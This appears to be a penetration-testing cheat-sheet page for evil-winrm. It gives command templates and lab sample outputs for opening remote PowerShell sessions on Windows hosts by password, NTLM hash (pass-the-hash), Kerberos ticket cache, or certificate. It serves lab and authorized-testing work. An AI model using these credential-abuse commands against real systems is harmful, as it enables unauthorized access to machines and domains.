---
title: "evil-winrm"
date: 2024-7-27
tags: ["Kerberos", "Pass-The-Hash", "RCE", "Evil-Winrm", "Windows", "Pass-The-Ticket", "Pass-The-Cert"]
---

### Connection Methods

{{< tab set1 tab1 active >}}Password{{< /tab >}}
{{< tab set1 tab2 >}}Hash{{< /tab >}}
{{< tab set1 tab3 >}}Kerberos{{< /tab >}}
{{< tab set1 tab4 >}}crt & key{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>'
```

```console {class=sample-code}
$ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p 'qwe123QWE!@#'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Dr.Zaiuss\Documents>
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
evil-winrm -i <TARGET> -u <USER> -H <HASH> 
```

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
# Step 1: Edit '/etc/krb5.conf' (All in uppercase)

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```console {class="sample-code"}
[libdefaults]
    default_realm = WINDCORP.HTB

[realms]
    WINDCORP.HTB = {
        kdc = HOPE.WINDCORP.HTB:88
        admin_server = HOPE.WINDCORP.HTB
        default_domain = WINDCORP.HTB
    }
    
[domain_realm]
    .domain.internal = WINDCORP.HTB
    domain.internal = WINDCORP.HTB
```

```console
# Step 2: export .ccache
export KRB5CCNAME=<CCACHE>
```

```console {class="sample-code"}
$ export KRB5CCNAME=winrm_user.ccache
```

```console
# Step 3: Connect
sudo ntpdate -s <DC> && evil-winrm -i <TARGET> -r <DOMAIN>
```

```console {class="sample-code"}
$ evil-winrm -i dc.absolute.htb -r absolute.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> 
```

{{< /tabcontent >}}
{{< tabcontent set1 tab4 >}}

```console
evil-winrm -i <TARGET> -S -k auth.key -c auth.crt
```

{{< /tabcontent >}}
